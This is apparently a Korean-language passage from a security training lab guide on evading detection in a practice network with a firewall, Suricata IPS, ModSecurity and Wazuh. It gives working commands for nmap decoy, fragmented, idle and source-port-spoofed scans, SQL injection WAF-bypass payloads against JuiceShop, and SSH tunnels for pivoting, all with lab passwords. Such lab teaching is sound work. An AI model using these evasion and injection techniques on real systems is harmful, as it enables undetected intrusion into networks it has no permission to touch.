...
| 컨테이너 | 6v6 IP | 역할 | 접속 |
|---------|--------|------|------|
| bastion | 10.20.30.201 (ext) | Control Plane (Bastion 운영 에이전트, KG, A2A) | `ssh 6v6-bastion` (pw: ccc) |
| attacker | 10.20.30.202 (ext) | 공격 출발점 (pen-test 도구 curl/nmap/nikto/whatweb/sqlmap/hydra) | `ssh 6v6-attacker` |
| fw | 10.20.30.1 (ext) + 10.20.31.1 (pipe) | nftables + HAProxy host-header 라우팅 (dual NIC = router 모드) | `ssh 6v6-fw` (ProxyJump bastion) |
| ips | 10.20.31.2 (pipe) + 10.20.32.1 (dmz) | Suricata IPS (dual NIC = router 모드) | `ssh 6v6-ips` (ProxyJump fw) |
| web | 10.20.32.80 (dmz) + 10.20.40.80 (int) | Apache + ModSecurity + JuiceShop/DVWA reverse (대상, dual NIC = vhost 라우팅) | `ssh 6v6-web` (ProxyJump fw) |
| siem | 10.20.32.100 (dmz) | Wazuh manager (alerts.json + active-response) | `ssh 6v6-siem` (ProxyJump fw) |
...
Decoy 패킷 (방어자가 보는 것):
  10.20.30.201 → 10.20.32.80 (실제)
  192.168.1.100 → 10.20.32.80 (가짜)
  172.16.0.50 → 10.20.32.80 (가짜)
  10.0.0.1 → 10.20.32.80 (가짜)
...
# 일반 스캔 (비교 기준)
echo "=== 일반 SYN 스캔 ==="
echo 1 | sudo -S nmap -sS -p 22,80 10.20.32.80 2>/dev/null | grep "open\|PORT"

echo ""
echo "=== Decoy 스캔 (5개 가짜 IP 사용) ==="
# -D RND:5 = 5개 랜덤 Decoy IP 생성
echo 1 | sudo -S nmap -sS -D RND:5 -p 22,80 10.20.32.80 2>/dev/null | grep "open\|PORT"

echo ""
echo "=== Decoy 스캔 (특정 IP 지정) ==="
# 실제 내부 네트워크 IP를 Decoy로 사용 (더 현실적)
echo 1 | sudo -S nmap -sS -D 10.20.30.1,10.20.30.100,10.20.30.50,ME -p 22,80 10.20.32.80 2>/dev/null | grep "open\|PORT"
...
# 일반 스캔 (비교 기준)
echo "=== 일반 SYN 스캔 ==="
echo 1 | sudo -S nmap -sS -p 22,80,3000 10.20.32.80 2>/dev/null | grep "open\|PORT"

echo ""
echo "=== 프래그먼트 스캔 (-f: 8바이트 조각) ==="
echo 1 | sudo -S nmap -sS -f -p 22,80,3000 10.20.32.80 2>/dev/null | grep "open\|PORT"

echo ""
echo "=== 더 작은 프래그먼트 (-ff: 16바이트 → 실제론 더 세분화) ==="
echo 1 | sudo -S nmap -sS -ff -p 22,80,3000 10.20.32.80 2>/dev/null | grep "open\|PORT"

echo ""
echo "=== 커스텀 MTU (24바이트) ==="
echo 1 | sudo -S nmap -sS --mtu 24 -p 22,80,3000 10.20.32.80 2>/dev/null | grep "open\|PORT"

echo ""
echo "=== tcpdump으로 프래그먼트 확인 ==="
# 프래그먼트된 패킷 관찰 (3초 캡처)
echo 1 | sudo -S timeout 5 tcpdump -i any -c 20 'host 10.20.32.80 and (ip[6:2] & 0x1fff != 0)' 2>/dev/null || echo "프래그먼트 패킷 미캡처 (정상일 수 있음)"
```
...
echo 1 | sudo -S nmap -sI 10.20.30.100 -p 22,80 10.20.32.80 2>/dev/null || echo "Idle Scan 실행 불가 (Zombie가 적합하지 않을 수 있음)"
```
...
echo 1 | sudo -S nmap -sS --source-port 53 -p 22,80,443 10.20.32.80 2>/dev/null | grep "open\|filtered\|PORT"

echo ""
echo "=== 소스 포트 80 (HTTP) 스캔 ==="
echo 1 | sudo -S nmap -sS -g 80 -p 22,80,443 10.20.32.80 2>/dev/null | grep "open\|filtered\|PORT"

echo ""
echo "=== 소스 포트 443 (HTTPS) 스캔 ==="
echo 1 | sudo -S nmap -sS -g 443 -p 22,3000,8002 10.20.32.80 2>/dev/null | grep "open\|filtered\|PORT"
...
curl -s "http://10.20.40.81:3000/rest/products/search?q=' UNION SELECT 1--" 2>/dev/null | head -3

echo ""
echo "=== 2. URL 인코딩 우회 ==="
# ' = %27, UNION = %55NION
curl -s "http://10.20.40.81:3000/rest/products/search?q=%27%20%55NION%20%53ELECT%201--" 2>/dev/null | head -3

echo ""
echo "=== 3. 이중 인코딩 우회 ==="
# ' = %2527 (% = %25, 27 유지)
curl -s "http://10.20.40.81:3000/rest/products/search?q=%2527%20UNION%20SELECT%201--" 2>/dev/null | head -3
...
echo ""
echo "=== 5. 주석 삽입 우회 ==="
curl -s "http://10.20.40.81:3000/rest/products/search?q=' UN/**/ION SE/**/LECT 1--" 2>/dev/null | head -3
...
echo "=== T4 (공격적) 스캔 ==="
START=$(date +%s)
echo 1 | sudo -S nmap -sS -T4 -p 22,80 10.20.32.80 2>/dev/null | grep "open"
END=$(date +%s)
...
START=$(date +%s)
echo 1 | sudo -S nmap -sS --scan-delay 10s --max-retries 0 -p 22,80 10.20.32.80 2>/dev/null | grep "open"
END=$(date +%s)
echo "소요시간: $((END-START))초"
...
>
> **명령어 해설**: -L 8888:10.20.32.80:3000은 로컬 8888포트를 원격 3000에 연결한다
>
...
sshpass -p1 ssh -f -N -L 8888:10.20.40.81:3000 ccc@10.20.32.80 2>/dev/null
sleep 2
...
# 터널 정리
kill $(pgrep -f "ssh.*8888:10.20.40.81:3000" 2>/dev/null) 2>/dev/null
echo "[SSH 터널 정리 완료]"
```
...
echo "=== SOCKS 프록시 설정 ==="
sshpass -p1 ssh -f -N -D 1080 ccc@10.20.32.80 2>/dev/null
sleep 2
...
echo 1 | sudo -S nmap -sS -f -D RND:3 --scan-delay 3s -p 22,80,3000 10.20.32.80 2>/dev/null | grep "open\|PORT"

echo ""
echo "[단계 2] 소스 포트 53(DNS) 사용 + 서비스 감지"
echo 1 | sudo -S nmap -sV --source-port 53 -p 22,80,3000 10.20.32.80 2>/dev/null | grep "open\|PORT"

echo ""
echo "[단계 3] 인코딩된 웹 공격 (WAF/IDS 우회)"
# URL 인코딩 + 대소문자 혼합
curl -s -o /dev/null -w "HTTP %{http_code}" \
  "http://10.20.40.81:3000/rest/products/search?q=%27%20UnIoN%20SeLeCt%201--" 2>/dev/null
echo ""

echo ""
echo "[단계 4] SSH 터널 통한 내부 접근"
sshpass -p1 ssh -f -N -L 9999:localhost:8002 ccc@10.20.32.80 2>/dev/null
sleep 1
